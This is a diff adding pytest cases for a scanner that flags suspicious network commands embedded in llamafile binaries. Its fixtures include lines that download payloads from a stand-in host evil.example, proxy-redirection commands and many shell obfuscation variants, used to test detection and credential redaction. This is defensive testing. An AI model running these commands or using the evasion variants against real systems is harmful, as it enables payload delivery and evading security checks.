+        "python -c \"print('curl internal-host')\"",
+        "powershell Write-Output 'curl internal-host'",
+        "bash -c 'echo \"x; curl internal-host\"'",
+        "FOO=curl internal-host",
+        "FOO=/usr/bin/curl internal-host",
+        "env FOO=curl internal-host",
+        "sudo --prompt=curl internal-host",
+        "sudo --user=curl internal-host",
+        "sudo --future=curl internal-host",
+        "exec -a=curl internal-host",
+        "bash -c 'FOO=curl internal-host'",
+        "bash -c 'echo ok # ; curl internal-host'",
+        "command FOO=bar curl internal-host",
+        "nohup FOO=bar curl internal-host",
+        "exec FOO=bar curl internal-host",
+        "echo $(curl) internal-host",
+        "echo $(echo curl internal-host)",
+        "bash -c 'echo $(curl) internal-host'",
+        "bash -c 'echo `curl` internal-host'",
+        r"echo \$(curl internal-host)",
+        r"bash -c 'echo \$(curl internal-host)'",
+        "bash -c \"echo '$(curl internal-host)'\"",
+        "curl http://localhost/ ; curl --proxy http://evil.example:8080",
+        "curl --proxy http://evil.example:8080 ; curl http://localhost/",
+        "curl http://localhost/ ; wget -e https_proxy=http://evil.example",
+        "echo curl evil.example",
+        'echo case x in "x)" curl internal-host',
+        "printf '%s' case x in 'x)' curl internal-host",
+        "bash -c 'echo case x in \"x)\" curl internal-host'",
+        '"case" x in x) curl internal-host',
+        '"then" curl internal-host',
+        '"coproc" curl internal-host',
+        "env FOO=--split-string='curl internal-host'",
+        "env --split-string='echo curl internal-host'",
+        "cat <<'EOF'\ncurl internal-host\nEOF",
+        "cat <<'END-MARK'\ncurl internal-host\nEND-MARK",
+        "cat <<\\EOF\ncurl internal-host\nEOF",
+        "tee <<'EOF'\ncurl internal-host\nEOF",
+        "sort <<'EOF'\ncurl internal-host\nEOF",
+        "sed -n p <<'EOF'\ncurl internal-host\nEOF",
+        "wc -c <<'EOF'\ncurl internal-host\nEOF",
+        "bash -n <<'EOF'\ncurl internal-host\nEOF",
+        "bash -o noexec <<'EOF'\ncurl internal-host\nEOF",
+        "bash -n <<< 'curl internal-host'",
+        "bash <<< 'echo curl internal-host'",
+        "printf 'hello' 'curl internal-host' | bash",
+        "printf '%s' 'echo curl internal-host' | bash",
+        "echo 'echo curl internal-host' | bash",
+        "printf '%s\\n' curl internal-host | bash",
+        "echo 'curl internal-host' | cat",
+        "echo \\\ncurl internal-host",
+        "printf %s \\\nwget internal-host",
+        "curl \\\r\ninternal-host",
+        "timeout --help curl internal-host",
+        "nice --help curl internal-host",
+        "setsid --help curl internal-host",
+        "stdbuf --help curl internal-host",
+        "xargs --help curl internal-host",
+        "builtin curl internal-host",
+        "curl -V internal-host",
+        "curl -M internal-host",
+        "curl -h all internal-host",
+        "curl -hs internal-host",
+        "curl -hsi internal-host",
+        "wget -V internal-host",
+        "wget -h internal-host",
+        "arr=(curl internal-host)",
+        "declare -a arr=(curl internal-host)",
+        "bash <<'EOF'\narr=(curl internal-host)\nEOF",
+        "curl user@localhost",
+        "echo c'u'rl internal-host",
+        "find . -exec curl internal-host ;",
+        "find . -exec curl internal-host ; echo \\;",
+        "find . -exec curl internal-host && echo \\;",
+        "find . -exec curl internal-host || echo \\;",
+        "find . -exec curl internal-host | echo \\;",
+        "find . -exec curl internal-host & echo \\;",
+        "ionice -p 123 curl internal-host",
+        "strace -p 123 curl internal-host",
+        "doas -C conf curl internal-host",
+        "gdb --args curl internal-host",
+        "eval 'echo curl internal-host'",
+        "f(){ curl internal-host; }",
+        "echo 'x; f(){ curl internal-host; }; f ;'",
+        'echo "x; f(){ curl internal-host; }; f ;"',
+        "printf '%s' 'x; f(){ curl internal-host; }; f ;'",
+        "subprocess.run('curl internal-host')",
+        "print(\"os.system('curl internal-host')\")",
+        "# os.system('curl internal-host')",
+        "logger.info(\"subprocess.run('curl internal-host')\")",
+        "echo 'curl internal-host' | sed 's/curl/echo/' | bash",
+        "echo 'curl internal-host' | grep -v curl | bash",
+        "bash <<< 'curl internal-host' /dev/null",
+        "bash <<< 'curl internal-host' -n",
+        "echo 'curl\\tinternal-host' | bash",
+        "echo -E 'curl\\tinternal-host' | bash",
+        "echo 'curl internal-host' >/dev/null | bash",
+        "echo 'curl internal-host' 1>out | bash",
+        "echo 'curl internal-host' &>out | bash",
+        "echo 'curl internal-host' >&2 | bash",
+        "printf 'curl internal-host' >out | bash",
+        "echo 'curl internal-host' || bash",
+        "printf 'curl internal-host' || bash",
+        "bash <<< 'curl internal-host' < /dev/null",
+        "echo '$(f(){ curl internal-host; }; f)'",
+    ],
+)
+def test_llamafile_scanner_does_not_correlate_non_transfer_command_text(
+    tmp_path: Path,
+    runtime_line: str,
+) -> None:
+    binary = tmp_path / "non-transfer-command-text.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert all(check.severity != IssueSeverity.CRITICAL for check in runtime_checks)
+
+
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
+        "curl --cacert cert.pem http://127.0.0.1/payload",
+        "curl -w status.txt http://user:secret@localhost/payload",
+        "wget -P output.dir http://127.0.0.1/payload",
+        "curl --noproxy evil.example http://localhost/payload",
+        "wget --referer https://ref.example http://localhost/payload",
+        "curl -H 'Referer: https://ref.example' http://localhost/payload",
+        "curl --connect-to localhost:80::80 http://localhost/payload",
+        "curl --connect-to localhost:80:[::1]:80 http://localhost/payload",
+        "curl --resolve localhost:80:[::1] http://localhost/payload",
+        "wget -e https_proxy=http://127.0.0.1 http://localhost/payload",
+        "wget --execute=robots=off http://localhost/payload",
+        "curl --output internal-host http://localhost/payload",
+        "curl localhost",
+        "curl 2130706433",
+        "curl 0",
+    ],
+)
+def test_llamafile_scanner_does_not_correlate_local_transfer_targets(
+    tmp_path: Path,
+    runtime_line: str,
+) -> None:
+    binary = tmp_path / "local-transfer.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+
+
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
+        "curl -u user:supersecret evil.example/payload.sh",
+        "wget --user=user --password=supersecret evil.example/payload.sh",
+        'curl --user "user:supersecret value" https://evil.example/payload.sh',
+        r"curl -u user:supersecret\ value https://evil.example/payload.sh",
+        "curl -uuser:supersecret https://evil.example/payload.sh",
+        "curl --oauth2-bearer=supersecret https://evil.example/payload.sh",
+    ],
+)
+def test_llamafile_scanner_redacts_transfer_option_credentials(
+    tmp_path: Path,
+    runtime_line: str,
+) -> None:
+    binary = tmp_path / "remote-transfer-credentials.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+    details = repr(runtime_issues[0].details)
+    assert "supersecret" not in details
+    assert "<redacted>" in details
+
+
+def test_llamafile_scanner_bounds_and_redacts_long_userinfo_evidence(tmp_path: Path) -> None:
+    binary = tmp_path / "long-userinfo.llamafile"
+    secret = "supersecret" * 200
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[f"curl user:{secret}@evil.example/payload"]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+    details = repr(runtime_issues[0].details)
+    assert "supersecret" not in details
+    assert "<redacted>" in details
+
+
+def test_llamafile_scanner_evidence_prefers_correlated_command_over_local_url(tmp_path: Path) -> None:
+    binary = tmp_path / "evidence-anchor.llamafile"
+    runtime_line = "http://localhost/ " + ("padding " * 180) + "bash -c curl http://evil.example/payload"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+    details = repr(runtime_issues[0].details)
+    assert "curl" in details
+    assert "evil.example" in details
+
+
 def test_llamafile_scanner_does_not_skip_mixed_safe_and_suspicious_runtime_string(tmp_path: Path) -> None:
     binary = tmp_path / "mixed.llamafile"
     binary.write_bytes(
         _build_llamafile_blob(
             runtime_lines=[
-                "llamafile curl http://evil.example/payload.sh",
+                "llamafile ; curl http://evil.example/payload.sh",
             ]
         )
     )
@@ -909,6 +3291,40 @@ def test_llamafile_scanner_allows_known_safe_runtime_fragments(tmp_path: Path) -
 
     runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
     assert runtime_issues == []
+
+
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
+        (
+            "error: APE is running on WIN32 inside WSL. You need to run: "
+            "sudo sh -c 'echo -1 > /proc/sys/fs/binfmt_misc/WSLInterop'"
+        ),
+        "keywords: cpp curl cvpa wget where powershell processing",
+        "If the server is reachable from curl or Node, use the client",
+        "If the server is reachable from curl or Node, use the /v1/chat/completions endpoint",
+        "The curl documentation is at docs/example.html",
+        "keywords: curl user@example.com for support",
+    ],
+)
+def test_llamafile_scanner_ignores_bundled_runtime_command_near_matches(
+    tmp_path: Path,
+    runtime_line: str,
+) -> None:
+    binary = tmp_path / "runtime-command-near-match.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+    command_hits: set[str] = set()
+    network_hits: set[str] = set()
+    LlamafileScanner()._merge_oversized_runtime_command_hits(
+        runtime_line.encode(),
+        command_hits,
+        network_hits,
+    )
+    assert command_hits == set()
 
 
 def test_llamafile_scanner_flags_mixed_safe_fragment_and_command_tokens(tmp_path: Path) -> None:
